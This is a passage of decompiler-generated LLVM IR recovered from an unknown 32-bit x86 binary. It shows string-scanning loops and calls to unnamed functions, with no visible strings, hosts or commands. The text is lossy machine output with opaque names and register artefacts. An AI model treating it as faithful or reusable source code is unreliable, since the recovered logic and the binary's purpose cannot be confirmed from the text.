  store i32 %v2_804861a, i32* %stack_var_-8812, align 4
  %v2_8048624 = inttoptr i32 %v2_804861a to i8*
  %v3_8048624 = call i32 @function_804af9d(i8* %v2_8048624, i32 0)
  store i32 %v3_8048624, i32* @ebp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v10_8048630 = icmp eq i32 %v3_8048624, -1
  br i1 %v10_8048630, label %dec_label_pc_8048a6d, label %dec_label_pc_804873f.preheader

dec_label_pc_804873f.preheader:                   ; preds = %dec_label_pc_80485e5
  store i32 %v2_804854e, i32* @eax, align 4
  store i32 %v2_804854e, i32* %stack_var_-8812, align 4
  %v3_804874e100 = call i32 @function_804a965(i32 %v2_804854e, i32 512, i32 0)
  store i32 %v3_804874e100, i32* %eax.global-to-local, align 4
  %v1_8048756101 = icmp eq i32 %v3_804874e100, 0
  br i1 %v1_8048756101, label %dec_label_pc_8048761, label %dec_label_pc_804875a.lr.ph

dec_label_pc_804875a.lr.ph:                       ; preds = %dec_label_pc_804873f.preheader
  %v2_8048678 = add i32 %v15_804852d, 8235
  br label %dec_label_pc_804875a

dec_label_pc_804863e:                             ; preds = %dec_label_pc_8048651
  %v1_804863e = add i32 %v0_804863e83, 1
  store i32 %v1_804863e, i32* %eax.global-to-local, align 4
  store i32 %v2_804854e, i32* @ebx, align 4
  %v2_8048646 = add i32 %v1_804863e, %v2_804854e
  %v3_8048646 = inttoptr i32 %v2_8048646 to i8*
  %v4_8048646 = load i8, i8* %v3_8048646, align 1
  %v5_8048646 = zext i8 %v4_8048646 to i32
  %v7_8048646 = and i32 %v8_804864686, -256
  %v8_8048646 = or i32 %v5_8048646, %v7_8048646
  %v4_8048649 = icmp eq i8 %v4_8048646, 0
  br i1 %v4_8048649, label %dec_label_pc_804873f.backedge, label %dec_label_pc_8048651

dec_label_pc_8048651:                             ; preds = %dec_label_pc_804875a, %dec_label_pc_804863e
  %v8_804864686 = phi i32 [ %v8_8048646, %dec_label_pc_804863e ], [ %v8_804864681, %dec_label_pc_804875a ]
  %v7_804864685 = phi i32 [ %v7_8048646, %dec_label_pc_804863e ], [ %v7_804864680, %dec_label_pc_804875a ]
  %v4_804864684 = phi i8 [ %v4_8048646, %dec_label_pc_804863e ], [ %v4_804864678, %dec_label_pc_804875a ]
  %v0_804863e83 = phi i32 [ %v1_804863e, %dec_label_pc_804863e ], [ 0, %dec_label_pc_804875a ]
  %v10_8048651 = icmp eq i8 %v4_804864684, 58
  %v1_8048654 = icmp eq i1 %v10_8048651, false
  br i1 %v1_8048654, label %dec_label_pc_804863e, label %dec_label_pc_8048656

dec_label_pc_8048656:                             ; preds = %dec_label_pc_8048651
  %v1_8048656 = add i32 %v0_804863e83, 2
  store i32 %v1_8048656, i32* @ecx, align 4
  %v2_8048659 = add i32 %v1_8048656, %v2_804854e
  store i32 %v2_8048659, i32* %eax.global-to-local, align 4
  %v1_804865f7 = inttoptr i32 %v2_8048659 to i8*
  %v2_804865f8 = load i8, i8* %v1_804865f7, align 1
  %v3_804865f9 = zext i8 %v2_804865f8 to i32
  %v6_804865f12 = or i32 %v3_804865f9, %v7_804864685
  %v4_804866113 = icmp eq i8 %v2_804865f8, 0
  br i1 %v4_804866113, label %dec_label_pc_804866a, label %dec_label_pc_8048665

dec_label_pc_804865e:                             ; preds = %dec_label_pc_8048665
  %v1_804865e = add i32 %v0_804865e, 1
  store i32 %v1_804865e, i32* %eax.global-to-local, align 4
  %v1_804865f = inttoptr i32 %v1_804865e to i8*
  %v2_804865f = load i8, i8* %v1_804865f, align 1
  %v3_804865f = zext i8 %v2_804865f to i32
  %v5_804865f = and i32 %v4_804865f, -256
  %v6_804865f = or i32 %v3_804865f, %v5_804865f
  %v4_8048661 = icmp eq i8 %v2_804865f, 0
  br i1 %v4_8048661, label %dec_label_pc_804866a, label %dec_label_pc_8048665

dec_label_pc_8048665:                             ; preds = %dec_label_pc_8048656, %dec_label_pc_804865e
  %v0_804865e = phi i32 [ %v1_804865e, %dec_label_pc_804865e ], [ %v2_8048659, %dec_label_pc_8048656 ]
  %v4_804865f = phi i32 [ %v6_804865f, %dec_label_pc_804865e ], [ %v6_804865f12, %dec_label_pc_8048656 ]
  %v1_8048665 = trunc i32 %v4_804865f to i8
  %v7_8048665 = icmp eq i8 %v1_8048665, 32
  %v1_8048668 = icmp eq i1 %v7_8048665, false
  br i1 %v1_8048668, label %dec_label_pc_804865e, label %dec_label_pc_804866a

dec_label_pc_804866a:                             ; preds = %dec_label_pc_804865e, %dec_label_pc_8048665, %dec_label_pc_8048656
  %v0_8048671 = phi i32 [ %v2_8048659, %dec_label_pc_8048656 ], [ %v1_804865e, %dec_label_pc_804865e ], [ %v0_804865e, %dec_label_pc_8048665 ]
  store i32 %v2_804854e, i32* @edi, align 4
  %v2_8048673 = sub i32 %v0_8048671, %v2_804854e
  store i32 %v2_8048673, i32* @esi, align 4
  store i32 %v2_8048659, i32* @ebx, align 4
  %v3_8048678 = add i32 %v2_8048678, %v2_8048673
  %v4_8048678 = inttoptr i32 %v3_8048678 to i8*
  store i8 0, i8* %v4_8048678, align 1
  %v0_8048683 = load i32, i32* @ebx, align 4
  store i32 %v0_8048683, i32* %stack_var_-8812, align 4
  %v1_8048684 = call i32 @function_804a688(i32 %v0_8048683)
  store i32 %v1_8048684, i32* %eax.global-to-local, align 4
  store i32 %v2_8048591, i32* @edx, align 4
  %v0_8048695 = load i32, i32* @ebx, align 4
  store i32 %v0_8048695, i32* %stack_var_-8812, align 4
  %v3_8048696 = inttoptr i32 %v0_8048695 to i8*
  %v4_8048696 = call i32 @function_804ad50(i8* %v3_8048696, i32 %v1_8048684, i32 %v2_8048591)
  %v1_804869e = add i32 %v4_8048696, 1
  %v8_804869e = icmp eq i32 %v1_804869e, 0
  store i32 %v1_804869e, i32* %eax.global-to-local, align 4
  br i1 %v8_804869e, label %dec_label_pc_804873f.backedge, label %dec_label_pc_80486a5

dec_label_pc_804873f.backedge:                    ; preds = %dec_label_pc_804875a, %dec_label_pc_804863e, %dec_label_pc_804866a, %dec_label_pc_80486eb, %dec_label_pc_804870a
  %v0_804873f.be = phi i32 [ 0, %dec_label_pc_804866a ], [ %v7_80486e3, %dec_label_pc_80486eb ], [ %v1_804871d, %dec_label_pc_804870a ], [ 0, %dec_label_pc_804875a ], [ %v1_804863e, %dec_label_pc_804863e ]
  store i32 %v2_804854e, i32* @eax, align 4
  store i32 %v2_804854e, i32* %stack_var_-8812, align 4
  %v3_804874e = call i32 @function_804a965(i32 %v2_804854e, i32 512, i32 %v0_804873f.be)
  store i32 %v3_804874e, i32* %eax.global-to-local, align 4
  %v1_8048756 = icmp eq i32 %v3_804874e, 0
  br i1 %v1_8048756, label %dec_label_pc_8048761, label %dec_label_pc_804875a

dec_label_pc_80486a5:                             ; preds = %dec_label_pc_804866a
  %v0_80486a5 = load i32, i32* @esi, align 4
  %v1_80486a5 = add i32 %v0_80486a5, 1
  %v0_80486aa = load i32, i32* @edi, align 4
  %v2_80486aa = add i32 %v0_80486aa, %v0_80486a5
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80486e3.outer

dec_label_pc_80486e3.outer:                       ; preds = %dec_label_pc_80486cc, %dec_label_pc_80486a5
  %v0_80486c634 = phi i32 [ %v1_80486c6, %dec_label_pc_80486cc ], [ 0, %dec_label_pc_80486a5 ]
  %v0_80486e629 = phi i32 [ %v1_80486e6, %dec_label_pc_80486cc ], [ %v1_80486a5, %dec_label_pc_80486a5 ]
  %v5_80486e328 = phi i32 [ %v7_80486e3, %dec_label_pc_80486cc ], [ %v1_804869e, %dec_label_pc_80486a5 ]
  %v0_80486e326 = phi i32 [ %v1_8048a65, %dec_label_pc_80486cc ], [ %v2_80486aa, %dec_label_pc_80486a5 ]
  %stack_var_-8773.0.ph = phi i8 [ %stack_var_-8773.0., %dec_label_pc_80486cc ], [ 0, %dec_label_pc_80486a5 ]
  br label %dec_label_pc_80486e3

dec_label_pc_80486b6:                             ; preds = %dec_label_pc_80486e3
  %v7_80486b6 = icmp eq i8 %v3_80486e3, 32
  br i1 %v7_80486b6, label %dec_label_pc_80486be, label %dec_label_pc_80486ba

dec_label_pc_80486ba:                             ; preds = %dec_label_pc_80486b6
  %v10_80486ba = icmp eq i8 %v3_80486e3, 9
  %v1_80486bc = icmp eq i1 %v10_80486ba, false
  br i1 %v1_80486bc, label %dec_label_pc_80486c2, label %dec_label_pc_80486be

dec_label_pc_80486be:                             ; preds = %dec_label_pc_80486ba, %dec_label_pc_80486b6
  %v1_80486be = and i32 %v0_80486be, -256
  %v2_80486be = or i32 %v1_80486be, 1
  br label %dec_label_pc_80486dd

dec_label_pc_80486c2:                             ; preds = %dec_label_pc_80486ba
  %v1_80486c2 = trunc i32 %v0_80486be to i8
  %v9_80486c2 = icmp eq i8 %v1_80486c2, 1
  %v1_80486c4 = icmp eq i1 %v9_80486c2, false
  br i1 %v1_80486c4, label %dec_label_pc_80486db, label %dec_label_pc_80486c6

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_80486c2
  %v1_80486c6 = add i32 %v0_80486c6, 1
  store i32 %v1_80486c6, i32* @esi, align 4
  %v9_80486c7 = icmp eq i32 %v0_80486c6, 0
  %v1_80486ca = icmp eq i1 %v9_80486c7, false
  br i1 %v1_80486ca, label %dec_label_pc_80486db, label %dec_label_pc_80486cc

dec_label_pc_80486cc:                             ; preds = %dec_label_pc_80486c6
  %v1_80486cc = add i32 %v0_80486dd, 3
  %v2_80486cc = inttoptr i32 %v1_80486cc to i8*
  %v3_80486cc = load i8, i8* %v2_80486cc, align 1
  %v12_80486cc = icmp eq i8 %v3_80486cc, 65
  %v1_80486d0 = icmp eq i1 %v12_80486cc, false
  %stack_var_-8773.0. = select i1 %v1_80486d0, i8 %stack_var_-8773.0.ph, i8 1
  %v1_8048a65 = add i32 %v0_80486dd, 1
  br label %dec_label_pc_80486e3.outer

dec_label_pc_80486db:                             ; preds = %dec_label_pc_80486c6, %dec_label_pc_80486c2
  %v0_80486de35 = phi i32 [ %v1_80486c6, %dec_label_pc_80486c6 ], [ %v0_80486c6, %dec_label_pc_80486c2 ]
  br label %dec_label_pc_80486dd

dec_label_pc_80486dd:                             ; preds = %dec_label_pc_80486be, %dec_label_pc_80486db
  %v0_80486de = phi i32 [ %v0_80486c6, %dec_label_pc_80486be ], [ %v0_80486de35, %dec_label_pc_80486db ]
  %storemerge4 = phi i32 [ %v2_80486be, %dec_label_pc_80486be ], [ 0, %dec_label_pc_80486db ]
  %v1_80486dd = add i32 %v0_80486dd, 1
  %v1_80486de = add i32 %v0_80486de, -6
  %v6_80486de = sub i32 5, %v0_80486de
  %v7_80486de = and i32 %v6_80486de, %v0_80486de
  %v8_80486de = icmp slt i32 %v7_80486de, 0
  %v9_80486de = icmp eq i32 %v1_80486de, 0
  %v10_80486de = icmp slt i32 %v1_80486de, 0
  %v3_80486e1 = icmp eq i1 %v10_80486de, %v8_80486de
  %v4_80486e1 = icmp eq i1 %v9_80486de, false
  %v5_80486e1 = and i1 %v4_80486e1, %v3_80486e1
  br i1 %v5_80486e1, label %dec_label_pc_80486eb, label %dec_label_pc_80486e3

dec_label_pc_80486e3:                             ; preds = %dec_label_pc_80486e3.outer, %dec_label_pc_80486dd
  %v0_80486c6 = phi i32 [ %v0_80486c634, %dec_label_pc_80486e3.outer ], [ %v0_80486de, %dec_label_pc_80486dd ]
  %v0_80486be = phi i32 [ 0, %dec_label_pc_80486e3.outer ], [ %storemerge4, %dec_label_pc_80486dd ]
  %v0_80486e6 = phi i32 [ %v0_80486e629, %dec_label_pc_80486e3.outer ], [ %v1_80486e6, %dec_label_pc_80486dd ]
  %v5_80486e3 = phi i32 [ %v5_80486e328, %dec_label_pc_80486e3.outer ], [ %v7_80486e3, %dec_label_pc_80486dd ]
  %v0_80486dd = phi i32 [ %v0_80486e326, %dec_label_pc_80486e3.outer ], [ %v1_80486dd, %dec_label_pc_80486dd ]
  %v1_80486e3 = add i32 %v0_80486dd, 2
  %v2_80486e3 = inttoptr i32 %v1_80486e3 to i8*
  %v3_80486e3 = load i8, i8* %v2_80486e3, align 1
  %v4_80486e3 = zext i8 %v3_80486e3 to i32
  %v6_80486e3 = and i32 %v5_80486e3, -256
  %v7_80486e3 = or i32 %v4_80486e3, %v6_80486e3
  store i32 %v7_80486e3, i32* %eax.global-to-local, align 4
  %v1_80486e6 = add i32 %v0_80486e6, 1
  %v4_80486e7 = icmp eq i8 %v3_80486e3, 0
  %v1_80486e9 = icmp eq i1 %v4_80486e7, false
  br i1 %v1_80486e9, label %dec_label_pc_80486b6, label %dec_label_pc_80486eb

dec_label_pc_80486eb:                             ; preds = %dec_label_pc_80486dd, %dec_label_pc_80486e3
  %v4_80486fe39 = phi i32 [ %v1_80486dd, %dec_label_pc_80486dd ], [ %v0_80486dd, %dec_label_pc_80486e3 ]
  %v4_80486eb = icmp eq i8 %stack_var_-8773.0.ph, 0
  store i32 %v1_80486e6, i32* @ebx, align 4
  br i1 %v4_80486eb, label %dec_label_pc_804873f.backedge, label %dec_label_pc_80486f4

dec_label_pc_80486f4:                             ; preds = %dec_label_pc_80486eb
  %v3_80486f4 = add i32 %v1_80486e6, %v2_8048678
  store i32 %v3_80486f4, i32* %eax.global-to-local, align 4
  %v1_80486fe87 = inttoptr i32 %v3_80486f4 to i8*
  %v2_80486fe88 = load i8, i8* %v1_80486fe87, align 1
  %v3_80486fe89 = zext i8 %v2_80486fe88 to i32
  %v5_80486fe90 = and i32 %v4_80486fe39, -256
  %v6_80486fe91 = or i32 %v3_80486fe89, %v5_80486fe90
  %v1_804870092 = add i32 %v3_80486f4, 1
  store i32 %v1_804870092, i32* %eax.global-to-local, align 4
  %v4_804870193 = icmp eq i8 %v2_80486fe88, 0
  br i1 %v4_804870193, label %dec_label_pc_804870a, label %dec_label_pc_8048705

dec_label_pc_80486fd:                             ; preds = %dec_label_pc_8048705
  %v1_80486fd = add i32 %v1_804870a94, 1
  %v1_80486fe = inttoptr i32 %v1_804870097 to i8*
  %v2_80486fe = load i8, i8* %v1_80486fe, align 1
  %v3_80486fe = zext i8 %v2_80486fe to i32
  %v5_80486fe = and i32 %v6_80486fe96, -256
  %v6_80486fe = or i32 %v3_80486fe, %v5_80486fe
  %v1_8048700 = add i32 %v1_804870097, 1
  store i32 %v1_8048700, i32* %eax.global-to-local, align 4
  %v4_8048701 = icmp eq i8 %v2_80486fe, 0
  br i1 %v4_8048701, label %dec_label_pc_804870a, label %dec_label_pc_8048705

dec_label_pc_8048705:                             ; preds = %dec_label_pc_80486f4, %dec_label_pc_80486fd
  %v1_804870097 = phi i32 [ %v1_8048700, %dec_label_pc_80486fd ], [ %v1_804870092, %dec_label_pc_80486f4 ]
  %v6_80486fe96 = phi i32 [ %v6_80486fe, %dec_label_pc_80486fd ], [ %v6_80486fe91, %dec_label_pc_80486f4 ]
  %v2_80486fe95 = phi i8 [ %v2_80486fe, %dec_label_pc_80486fd ], [ %v2_80486fe88, %dec_label_pc_80486f4 ]
  %v1_804870a94 = phi i32 [ %v1_80486fd, %dec_label_pc_80486fd ], [ %v1_80486e6, %dec_label_pc_80486f4 ]
  %v7_8048705 = icmp eq i8 %v2_80486fe95, 32
  %v1_8048708 = icmp eq i1 %v7_8048705, false
  br i1 %v1_8048708, label %dec_label_pc_80486fd, label %dec_label_pc_804870a

dec_label_pc_804870a:                             ; preds = %dec_label_pc_80486fd, %dec_label_pc_8048705, %dec_label_pc_80486f4
  %v1_804870a.lcssa = phi i32 [ %v1_80486e6, %dec_label_pc_80486f4 ], [ %v1_804870a94, %dec_label_pc_8048705 ], [ %v1_80486fd, %dec_label_pc_80486fd ]
  %v3_804870a = add i32 %v1_804870a.lcssa, %v2_8048678
  %v4_804870a = inttoptr i32 %v3_804870a to i8*
  store i8 0, i8* %v4_804870a, align 1
  %v0_8048712 = load i32, i32* @esp, align 4
  %v1_8048712 = load i32, i32* @ebx, align 4
  %v2_8048712 = add i32 %v0_8048712, 8235
  %v3_8048712 = add i32 %v2_8048712, %v1_8048712
  store i32 %v3_8048712, i32* @ebx, align 4
  store i32 %v3_8048712, i32* %stack_var_-8812, align 4
  %v1_804871d = call i32 @function_804a688(i32 %v3_8048712)
  store i32 %v1_804871d, i32* %eax.global-to-local, align 4
  %v1_8048725 = add i32 %v1_804871d, -15
  %v6_8048725 = sub i32 14, %v1_804871d
  %v7_8048725 = and i32 %v6_8048725, %v1_804871d
  %v8_8048725 = icmp slt i32 %v7_8048725, 0
  %v9_8048725 = icmp eq i32 %v1_8048725, 0
  %v10_8048725 = icmp slt i32 %v1_8048725, 0
  %v3_8048728 = icmp eq i1 %v10_8048725, %v8_8048725
  %v4_8048728 = icmp eq i1 %v9_8048725, false
  %v5_8048728 = and i1 %v4_8048728, %v3_8048728
  br i1 %v5_8048728, label %dec_label_pc_804873f.backedge, label %dec_label_pc_804872a

dec_label_pc_804872a:                             ; preds = %dec_label_pc_804870a
  %v0_804872c = load i32, i32* @ebx, align 4
  store i32 %v2_804853b, i32* %eax.global-to-local, align 4
  store i32 %v2_804853b, i32* %stack_var_-8812, align 4
  %v2_8048735 = call i32 @function_804a6d6(i32 %v2_804853b, i32 %v0_804872c)
  store i32 %v2_8048735, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048761

dec_label_pc_804875a:                             ; preds = %dec_label_pc_804875a.lr.ph, %dec_label_pc_804873f.backedge
  %v6_8048646.pre = load i32, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804854e, i32* @ebx, align 4
  %v4_804864678 = load i8, i8* %v3_804855e, align 4
  %v5_804864679 = zext i8 %v4_804864678 to i32
  %v7_804864680 = and i32 %v6_8048646.pre, -256
  %v8_804864681 = or i32 %v5_804864679, %v7_804864680
  %v4_804864982 = icmp eq i8 %v4_804864678, 0
  br i1 %v4_804864982, label %dec_label_pc_804873f.backedge, label %dec_label_pc_8048651

dec_label_pc_8048761:                             ; preds = %dec_label_pc_804873f.preheader, %dec_label_pc_804873f.backedge, %dec_label_pc_804872a
  %v0_8048764 = load i32, i32* @ebp, align 4
  store i32 %v0_8048764, i32* %stack_var_-8812, align 4
  %v1_8048765 = call i32 @function_804ae74(i32 %v0_8048764)
  %v2_804876a = load i32, i32* %stack_var_-8812, align 4
  store i32 %v2_804876a, i32* @ebp, align 4
  store i32 %v2_804853b, i32* %eax.global-to-local, align 4
  store i32 %v2_804853b, i32* %stack_var_-8812, align 4
  %v1_8048773 = call i32 @function_804a688(i32 %v2_804853b)
  store i32 %v1_8048773, i32* @eax, align 4
  %v1_804877b = icmp eq i32 %v1_8048773, 0
  %v1_804877d = icmp eq i1 %v1_804877b, false
  store i32 3, i32* %stack_var_-8812, align 4
  br i1 %v1_804877d, label %dec_label_pc_80487b4, label %dec_label_pc_804877f

dec_label_pc_804877f:                             ; preds = %dec_label_pc_8048761
  %v2_8048784 = call i32 @function_804820a(i8 3)
  store i32 %v2_8048784, i32* @eax, align 4
  store i32 5, i32* %stack_var_-8812, align 4
  %v2_8048790 = call i32 @function_804820a(i8 5)
  store i32 %v2_8048790, i32* @eax, align 4
  store i32 7, i32* %stack_var_-8812, align 4
  %v2_804879c = call i32 @function_804820a(i8 7)
  store i32 %v2_804879c, i32* @eax, align 4
  store i32 6, i32* %stack_var_-8812, align 4
  %v2_80487a8 = call i32 @function_804820a(i8 6)
  store i32 %v2_80487a8, i32* %eax.global-to-local, align 4
  %v0_8048a5b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048a5b

dec_label_pc_80487b4:                             ; preds = %dec_label_pc_8048761
  %v2_80487b9 = call i32 @function_804828b(i8 3)
  store i32 %v2_80487b9, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b9, i32* %stack_var_-8812, align 4
  %v1_80487c1 = call i32 @function_804b1bb(i32 %v2_80487b9)
  store i32 %v1_80487c1, i32* %eax.global-to-local, align 4
  %v4_80487cd = icmp eq i32 %v1_80487c1, 0
  br i1 %v4_80487cd, label %dec_label_pc_8048a1c, label %dec_label_pc_80489ef

dec_label_pc_80487e5:                             ; preds = %dec_label_pc_8048a02
  %v1_80487e5 = add i32 %v0_80489f6, 11
  store i32 %v1_80487e5, i32* @edx, align 4
  %v2_80487e8 = add i32 %v0_80489fb, 40
  %v3_80487e8 = inttoptr i32 %v2_80487e8 to i32*
  store i32 %v1_80487e5, i32* %v3_80487e8, align 4
  %v2_80487ec = inttoptr i32 %v1_80487e5 to i8*
  %v3_80487ec = load i8, i8* %v2_80487ec, align 1
  %v2_80487ef = add i8 %v3_80487ec, -48
  %v12_80487ef = zext i8 %v2_80487ef to i32
  %v14_80487ef = and i32 %v0_80489f6, -256
  %v15_80487ef = or i32 %v12_80487ef, %v14_80487ef
  store i32 %v15_80487ef, i32* @eax, align 4
  %v8_80487f3 = icmp ugt i8 %v2_80487ef, 9
  %v0_80489ef.pre.pre = load i32, i32* @esp, align 4
  br i1 %v8_80487f3, label %dec_label_pc_80489ef, label %dec_label_pc_80487f9

dec_label_pc_80487f9:                             ; preds = %dec_label_pc_80487e5
  %v1_80487fc = add i32 %v0_80489ef.pre.pre, -16
  %v2_80487fc = inttoptr i32 %v1_80487fc to i32*
  store i32 3, i32* %v2_80487fc, align 4
  %v2_80487fe = call i32 @function_804828b(i8 0)
  store i32 %v2_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* %esi.global-to-local, align 4
  %v3_8048803 = add i32 %v0_8048803, 4
  %v1_8048804 = inttoptr i32 %v3_8048803 to i32*
  %v2_8048804 = load i32, i32* %v1_8048804, align 4
  store i32 %v2_8048804, i32* @edi, align 4
  store i32 %v2_80487fe, i32* %v1_8048804, align 4
  %v1_8048806 = add i32 %v0_8048803, 4155
  store i32 %v1_8048806, i32* @esi, align 4
  store i32 %v1_8048806, i32* %v1_8048803, align 4
  %v2_804880e = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804880e, i32* %eax.global-to-local, align 4
  %v0_8048813 = load i32, i32* @esi, align 4
  %v1_8048813 = load i32, i32* @esp, align 4
  %v2_8048813 = inttoptr i32 %v1_8048813 to i32*
  store i32 %v0_8048813, i32* %v2_8048813, align 4
  %v1_8048816 = call i32 @function_804a688(i32 0)
  store i32 %v1_8048816, i32* %eax.global-to-local, align 4
  %v0_804881b = load i32, i32* @esp, align 4
  %v1_804881b = inttoptr i32 %v0_804881b to i32*
  %v3_804881b = add i32 %v0_804881b, 4
  %v1_804881c = inttoptr i32 %v3_804881b to i32*
  %v2_804881c = load i32, i32* %v1_804881c, align 4
  store i32 %v2_804881c, i32* @ebx, align 4
  %v1_804881d = add i32 %v0_804881b, 40
  %v2_804881d = inttoptr i32 %v1_804881d to i32*
  %v3_804881d = load i32, i32* %v2_804881d, align 4
  store i32 %v3_804881d, i32* %v1_804881c, align 4
  %v0_8048821 = load i32, i32* @esi, align 4
  %v2_8048821 = add i32 %v0_8048821, %v1_8048816
  store i32 %v2_8048821, i32* %eax.global-to-local, align 4
  store i32 %v2_8048821, i32* %v1_804881b, align 4
  %v2_8048825 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8048825, i32* @eax, align 4
  %v0_804882a = load i32, i32* @esp, align 4
  %v1_804882a = inttoptr i32 %v0_804882a to i32*
  store i32 5, i32* %v1_804882a, align 4
  %v2_8048831 = call i32 @function_804828b(i8 0)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esi, align 4
  %v1_8048836 = load i32, i32* @esp, align 4
  %v2_8048836 = inttoptr i32 %v1_8048836 to i32*
  store i32 %v0_8048836, i32* %v2_8048836, align 4
  store i32 %v2_8048831, i32* @ebx, align 4
  %v1_804883b = call i32 @function_804a688(i32 0)
  store i32 %v1_804883b, i32* %eax.global-to-local, align 4
  %v0_8048840 = load i32, i32* @esp, align 4
  %v1_8048840 = inttoptr i32 %v0_8048840 to i32*
  %v2_8048840 = load i32, i32* %v1_8048840, align 4
  store i32 %v2_8048840, i32* @ebp, align 4
  %v3_8048840 = add i32 %v0_8048840, 4
  %v1_8048841 = inttoptr i32 %v3_8048840 to i32*
  %v0_8048842 = load i32, i32* @esi, align 4
  %v2_8048842 = add i32 %v0_8048842, %v1_804883b
  store i32 %v2_8048842, i32* %eax.global-to-local, align 4
  %v0_8048845 = load i32, i32* @ebx, align 4
  store i32 %v0_8048845, i32* %v1_8048841, align 4
  %v0_8048846 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048846, i32* %v1_8048840, align 4
  %v2_8048847 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_804884c = load i32, i32* @esp, align 4
  %v1_804884f = add i32 %v0_804884c, 8
  %v2_804884f = inttoptr i32 %v1_804884f to i32*
  store i32 4096, i32* %v2_804884f, align 4
  %v1_8048854 = add i32 %v0_804884c, 59
  store i32 %v1_8048854, i32* %eax.global-to-local, align 4
  %v2_8048858 = add i32 %v0_804884c, 4
  %v3_8048858 = inttoptr i32 %v2_8048858 to i32*
  store i32 %v1_8048854, i32* %v3_8048858, align 4
  %v0_8048859 = load i32, i32* @esi, align 4
  %v3_8048859 = inttoptr i32 %v0_804884c to i32*
  store i32 %v0_8048859, i32* %v3_8048859, align 4
  %v0_804885a = call i32 @function_804b01e()
  %v0_804885f = load i32, i32* @esp, align 4
  %v1_804885f = add i32 %v0_804885f, 16
  %v1_8048862 = add i32 %v0_804885a, 1
  %v8_8048862 = icmp eq i32 %v1_8048862, 0
  store i32 %v1_8048862, i32* @eax, align 4
  br i1 %v8_8048862, label %dec_label_pc_80489ef, label %dec_label_pc_8048869

dec_label_pc_8048869:                             ; preds = %dec_label_pc_80487f9
  %v2_804886c = inttoptr i32 %v0_804885f to i32*
  store i32 3, i32* %v2_804886c, align 4
  %v2_804886e = call i32 @function_804828b(i8 0)
  store i32 %v2_804886e, i32* %eax.global-to-local, align 4
  %v0_8048873 = load i32, i32* @esp, align 4
  %v1_8048873 = inttoptr i32 %v0_8048873 to i32*
  %v2_8048873 = load i32, i32* %v1_8048873, align 4
  store i32 %v2_8048873, i32* @ebx, align 4
  %v3_8048873 = add i32 %v0_8048873, 4
  %v1_8048874 = inttoptr i32 %v3_8048873 to i32*
  %v2_8048874 = load i32, i32* %v1_8048874, align 4
  store i32 %v2_8048874, i32* %edi.global-to-local, align 4
  store i32 %v2_804886e, i32* %v1_8048874, align 4
  %v0_8048876 = load i32, i32* @esi, align 4
  store i32 %v0_8048876, i32* %v1_8048873, align 4
  %v2_8048877 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8048877, i32* %eax.global-to-local, align 4
  %v0_804887c = load i32, i32* @esi, align 4
  %v1_804887c = load i32, i32* @esp, align 4
  %v2_804887c = inttoptr i32 %v1_804887c to i32*
  store i32 %v0_804887c, i32* %v2_804887c, align 4
  %v1_804887f = call i32 @function_804a688(i32 0)
  store i32 %v1_804887f, i32* %eax.global-to-local, align 4
  %v0_8048884 = load i32, i32* @esp, align 4
  %v1_8048884 = inttoptr i32 %v0_8048884 to i32*
  %v3_8048884 = add i32 %v0_8048884, 4
  %v1_8048885 = inttoptr i32 %v3_8048884 to i32*
  %v1_8048886 = add i32 %v0_8048884, 40
  %v2_8048886 = inttoptr i32 %v1_8048886 to i32*
  %v3_8048886 = load i32, i32* %v2_8048886, align 4
  store i32 %v3_8048886, i32* %v1_8048885, align 4
  %v0_804888a = load i32, i32* @esi, align 4
  %v2_804888a = add i32 %v0_804888a, %v1_804887f
  store i32 %v2_804888a, i32* %eax.global-to-local, align 4
  store i32 %v2_804888a, i32* %v1_8048884, align 4
  %v2_804888e = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804888e, i32* @eax, align 4
  %v0_8048893 = load i32, i32* @esp, align 4
  %v1_8048893 = inttoptr i32 %v0_8048893 to i32*
  store i32 7, i32* %v1_8048893, align 4
  %v2_804889a = call i32 @function_804828b(i8 0)
  store i32 %v2_804889a, i32* %eax.global-to-local, align 4
  %v0_804889f = load i32, i32* @esi, align 4
  %v1_804889f = load i32, i32* @esp, align 4
  %v2_804889f = inttoptr i32 %v1_804889f to i32*
  store i32 %v0_804889f, i32* %v2_804889f, align 4
  store i32 %v2_804889a, i32* @ebx, align 4
  %v1_80488a4 = call i32 @function_804a688(i32 0)
  store i32 %v1_80488a4, i32* %eax.global-to-local, align 4
  %v0_80488a9 = load i32, i32* @esp, align 4
  %v1_80488a9 = inttoptr i32 %v0_80488a9 to i32*
  %v2_80488a9 = load i32, i32* %v1_80488a9, align 4
  store i32 %v2_80488a9, i32* @edi, align 4
  %v3_80488a9 = add i32 %v0_80488a9, 4
  %v1_80488aa = inttoptr i32 %v3_80488a9 to i32*
  %v2_80488aa = load i32, i32* %v1_80488aa, align 4
  store i32 %v2_80488aa, i32* @ebp, align 4
  %v0_80488ab = load i32, i32* @esi, align 4
  %v2_80488ab = add i32 %v0_80488ab, %v1_80488a4
  store i32 %v2_80488ab, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @ebx, align 4
  store i32 %v0_80488ae, i32* %v1_80488aa, align 4
  %v0_80488af = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80488af, i32* %v1_80488a9, align 4
  %v2_80488b0 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_80488b0, i32* %eax.global-to-local, align 4
